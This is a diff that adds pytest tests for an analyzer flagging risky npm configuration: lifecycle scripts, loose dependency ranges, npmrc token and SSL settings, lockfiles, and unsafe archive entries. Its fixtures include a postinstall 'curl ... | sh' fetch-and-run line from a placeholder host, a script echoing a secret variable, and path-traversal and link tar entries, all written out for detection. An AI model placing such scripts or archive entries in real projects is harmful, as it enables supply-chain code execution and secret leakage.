@@ -1290,6 +1290,259 @@ async def test_analyze_secrets_review_respects_file_and_byte_limits(monkeypatch,
 
 
 @pytest.mark.anyio
+async def test_analyze_node_package_config_package_json_scripts_dependencies_and_metadata(monkeypatch, tmp_path):
+    package_json = {
+        "name": "node-demo",
+        "version": "1.0.0",
+        "private": False,
+        "scripts": {
+            "postinstall": "curl -fsSL https://example.invalid/install.sh | sh",
+            "prepare": "node build.js",
+            "install": "node install.js",
+            "build": "echo $SECRET_KEY",
+        },
+        "dependencies": {
+            "wild": "*",
+            "react": "^1.2.3",
+            "broad": ">=1",
+            "floating": "latest",
+            "gitpkg": "github:owner/repo",
+            "urlpkg": "https://example.invalid/pkg.tgz",
+            "filepkg": "file:../local",
+            "workpkg": "workspace:*",
+            "aliaspkg": "npm:left-pad@1.3.0",
+        },
+        "optionalDependencies": {"optional-native": "^2.0.0"},
+    }
+    archive_path = write_zip_archive(tmp_path, {"package.json": json.dumps(package_json).encode("utf-8")})
+    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
+    transport = ASGITransport(app=runner.app)
+
+    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
+        response = await client.post(
+            "/analyze/node-package-config",
+            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
+        )
+
+    payload = response.json()
+    finding_ids = {finding["id"] for finding in payload["findings"]}
+    assert response.status_code == 200
+    assert payload["analyzer"] == "node_package_config_basic"
+    assert payload["summary"]["package_manifests_detected"] == 1
+    assert payload["summary"]["packages_detected"] == 1
+    assert payload["summary"]["scripts_detected"] == 4
+    assert "postinstall_script_present" in finding_ids
+    assert "prepare_script_present" in finding_ids
+    assert "install_script_present" in finding_ids
+    assert "lifecycle_script_present" in finding_ids
+    assert "script_uses_shell_curl_pipe" in finding_ids
+    assert "script_references_env_secret_name" in finding_ids
+    assert "wildcard_dependency_version" in finding_ids
+    assert "broad_dependency_range" in finding_ids
+    assert "unpinned_dependency_range" in finding_ids
+    assert "git_dependency_reference" in finding_ids
+    assert "url_dependency_reference" in finding_ids
+    assert "file_dependency_reference" in finding_ids
+    assert "workspace_dependency_reference" in finding_ids
+    assert "alias_dependency_reference" in finding_ids
+    assert "optional_dependencies_present" in finding_ids
+    assert "package_private_false_or_missing" in finding_ids
+    assert "package_manager_missing" in finding_ids
+    assert "engines_missing" in finding_ids
+    assert "license_missing" in finding_ids
+    assert "repository_missing" in finding_ids
+
+
+@pytest.mark.anyio
+async def test_analyze_node_package_config_npmrc_redacts_tokens_and_flags(monkeypatch, tmp_path):
+    npmrc = b"""
+# //registry.npmjs.org/:_authToken=comment-token-should-not-appear
+registry=https://user:registry-pass-secret@registry.example.invalid/
+//registry.npmjs.org/:_authToken=fixture-token
+strict-ssl=false
+unsafe-perm=true
+ignore-scripts=true
+"""
+    archive_path = write_zip_archive(tmp_path, {".npmrc": npmrc})
+    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
+    transport = ASGITransport(app=runner.app)
+
+    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
+        response = await client.post(
+            "/analyze/node-package-config",
+            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
+        )
+
+    payload = response.json()
+    finding_ids = {finding["id"] for finding in payload["findings"]}
+    serialized = json.dumps(payload)
+    assert response.status_code == 200
+    assert payload["summary"]["package_manager_configs_detected"] == 1
+    assert "npmrc_token_reference_detected" in finding_ids
+    assert "npmrc_registry_override" in finding_ids
+    assert "npmrc_strict_ssl_disabled" in finding_ids
+    assert "npmrc_unsafe_perm_enabled" in finding_ids
+    assert "npmrc_ignore_scripts_configured" in finding_ids
+    assert "fixture-token" not in serialized
+    assert "registry-pass-secret" not in serialized
+    assert "comment-token-should-not-appear" not in serialized
+    assert "[REDACTED]" in serialized
+
+
+@pytest.mark.anyio
+async def test_analyze_node_package_config_lockfiles_env_and_binary_skips(monkeypatch, tmp_path):
+    package_json = {
+        "name": "node-demo",
+        "private": True,
+        "packageManager": "pnpm@9.0.0",
+        "engines": {"node": ">=20"},
+        "license": "MIT",
+        "repository": {"type": "git", "url": "https://example.invalid/repo.git"},
+    }
+    archive_path = write_zip_archive(
+        tmp_path,
+        {
+            "package.json": json.dumps(package_json).encode("utf-8"),
+            "package-lock.json": b'{"lockfileVersion": 3}\n',
+            "yarn.lock": b"# yarn lockfile\n",
+            "bun.lockb": b"\x00bun-binary-lock\n",
+            ".env.production": b"NPM_TOKEN=env-token-should-not-be-read\n",
+        },
+    )
+    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
+    transport = ASGITransport(app=runner.app)
+
+    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
+        response = await client.post(
+            "/analyze/node-package-config",
+            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
+        )
+
+    payload = response.json()
+    finding_ids = {finding["id"] for finding in payload["findings"]}
+    skip_reasons = {item.get("skip_reason") for item in payload["files_detected"]}
+    serialized = json.dumps(payload)
+    assert response.status_code == 200
+    assert payload["summary"]["lockfiles_detected"] == 3
+    assert "package_lock_present" in finding_ids
+    assert "multiple_lockfiles_present" in finding_ids
+    assert "package_manager_mismatch" in finding_ids
+    assert "node_package_config_real_env_file_not_read" in finding_ids
+    assert "node_package_config_binary_lockfile_not_read" in finding_ids
+    assert "real_env_file_not_read" in skip_reasons
+    assert "binary_lockfile_not_read" in skip_reasons
+    assert "env-token-should-not-be-read" not in serialized
+
+
+@pytest.mark.anyio
+async def test_analyze_node_package_config_js_ts_hints_comments_and_context(monkeypatch, tmp_path):
+    package_json = {"name": "example-node-demo", "scripts": {"postinstall": "node setup.js"}}
+    archive_path = write_zip_archive(
+        tmp_path,
+        {
+            "examples/package.json": json.dumps(package_json).encode("utf-8"),
+            "vite.config.ts": b"// server: { host: '0.0.0.0' }\nexport default {}\n",
+            "webpack.config.js": b"module.exports = { devServer: { host: '0.0.0.0' }, devtool: 'source-map' }\n",
+            "tsconfig.json": b'{"compilerOptions": {"skipLibCheck": true}}\n',
+        },
+    )
+    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
+    transport = ASGITransport(app=runner.app)
+
+    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
+        response = await client.post(
+            "/analyze/node-package-config",
+            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
+        )
+
+    payload = response.json()
+    findings = {finding["id"]: finding for finding in payload["findings"]}
+    postinstall = next(finding for finding in payload["findings"] if finding["id"] == "postinstall_script_present")
+    assert response.status_code == 200
+    assert postinstall["context"] == "example"
+    assert postinstall["level"] == "info"
+    assert "vite_dev_host_exposed_hint" not in findings
+    assert "webpack_dev_server_exposed_hint" in findings
+    assert "tsconfig_skip_lib_check_hint" in findings
+    assert "source_maps_enabled_hint" in findings
+
+
+@pytest.mark.anyio
+async def test_analyze_node_package_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
+    uploads_dir = tmp_path / "uploads"
+    uploads_dir.mkdir(exist_ok=True)
+    archive_path = uploads_dir / "project.tar"
+    with tarfile.open(archive_path, "w") as archive:
+        traversal_content = b'{"scripts":{"postinstall":"echo traversal-secret"}}\n'
+        traversal_info = tarfile.TarInfo("../package.json")
+        traversal_info.size = len(traversal_content)
+        archive.addfile(traversal_info, io.BytesIO(traversal_content))
+
+        link_info = tarfile.TarInfo("package.json")
+        link_info.type = tarfile.SYMTYPE
+        link_info.linkname = "real-package.json"
+        archive.addfile(link_info)
+
+        hardlink_info = tarfile.TarInfo(".npmrc")
+        hardlink_info.type = tarfile.LNKTYPE
+        hardlink_info.linkname = "real-npmrc"
+        archive.addfile(hardlink_info)
+
+    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
+    transport = ASGITransport(app=runner.app)
+
+    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
+        response = await client.post(
+            "/analyze/node-package-config",
+            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
+        )
+
+    payload = response.json()
+    reasons = {item["skip_reason"] for item in payload["files_detected"]}
+    serialized = json.dumps(payload)
+    assert response.status_code == 200
+    assert "path_traversal" in reasons
+    assert "not_regular_file:symlink" in reasons
+    assert "not_regular_file:hardlink" in reasons
+    assert "node_package_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
+    assert "node_package_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
+    assert "traversal-secret" not in serialized
+
+
+@pytest.mark.anyio
+async def test_analyze_node_package_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
+    monkeypatch.setattr(runner, "NODE_PACKAGE_CONFIG_MAX_FILES", 1)
+    monkeypatch.setattr(runner, "NODE_PACKAGE_CONFIG_MAX_FILE_BYTES", 70)
+    monkeypatch.setattr(runner, "NODE_PACKAGE_CONFIG_MAX_TOTAL_BYTES", 120)
+    archive_path = write_zip_archive(
+        tmp_path,
+        {
+            "package.json": b'{"name":"demo","scripts":{"test":"vitest"}}\n',
+            ".npmrc": b"//registry.npmjs.org/:_authToken=" + b"x" * 100 + b"\n",
+            "tsconfig.json": b'{"compilerOptions":{"skipLibCheck":true}}\n',
+        },
+    )
+    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
+    transport = ASGITransport(app=runner.app)
+
+    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
+        response = await client.post(
+            "/analyze/node-package-config",
+            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
+        )
+
+    payload = response.json()
+    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
+    serialized = json.dumps(payload)
+    assert response.status_code == 200
+    assert payload["summary"]["files_reviewed"] == 1
+    assert payload["summary"]["truncated"] is True
+    assert "file_too_large" in reasons
+    assert "too_many_files" in reasons
+    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized
+
+
+@pytest.mark.anyio
 async def test_analyze_web_basic_reports_http_headers_cookies_and_well_known_files():
     server = start_test_http_server()
     transport = ASGITransport(app=runner.app)
